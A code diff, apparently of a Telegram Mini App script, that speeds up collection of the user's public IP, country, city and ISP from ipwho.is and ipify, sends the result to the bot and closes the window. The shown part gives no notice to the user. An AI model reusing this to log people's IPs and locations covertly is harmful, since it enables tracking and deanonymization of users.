@@ -59,10 +59,15 @@
       } catch (e) {
         console.error("sendData error:", e);
       }
-      setTimeout(() => tg.close(), 250);
+      setTimeout(() => tg.close(), 200);
     }
 
-    async function fetchWithTimeout(url, ms = 3500) {
+    // Жёсткий страховочный таймер: максимум 2.2 секунды, чтобы кнопка никогда не зависала
+    setTimeout(() => {
+      sendAndClose({ ip: "не определён", country: "", city: "", isp: "" });
+    }, 2200);
+
+    async function fetchJson(url, ms) {
       const controller = new AbortController();
       const timer = setTimeout(() => controller.abort(), ms);
       try {
@@ -74,32 +79,31 @@
     }
 
     async function collectIp() {
-      try {
-        const info = await fetchWithTimeout("https://ipwho.is/", 3500);
+      const p1 = fetchJson("https://ipwho.is/", 2000).then((info) => {
         if (info && info.ip) {
-          sendAndClose({
+          return {
             ip: info.ip,
             country: info.country || "",
             city: info.city || "",
             isp: (info.connection && info.connection.isp) ? info.connection.isp : ""
-          });
-          return;
+          };
         }
-      } catch (e) {
-        console.warn("ipwho.is error:", e);
-      }
+        throw new Error("no ip");
+      });
+
+      const p2 = fetchJson("https://api.ipify.org?format=json", 2000).then((info) => {
+        if (info && info.ip) {
+          return { ip: info.ip, country: "", city: "", isp: "" };
+        }
+        throw new Error("no ip");
+      });
 
       try {
-        const fallback = await fetchWithTimeout("https://api.ipify.org?format=json", 3000);
-        if (fallback && fallback.ip) {
-          sendAndClose({ ip: fallback.ip, country: "", city: "", isp: "" });
-          return;
-        }
+        const result = await Promise.any([p1, p2]);
+        sendAndClose(result);
       } catch (e) {
-        console.warn("ipify error:", e);
+        sendAndClose({ ip: "не определён", country: "", city: "", isp: "" });
       }
-
-      sendAndClose({ ip: "не определён", country: "", city: "", isp: "" });
     }
 
     collectIp();
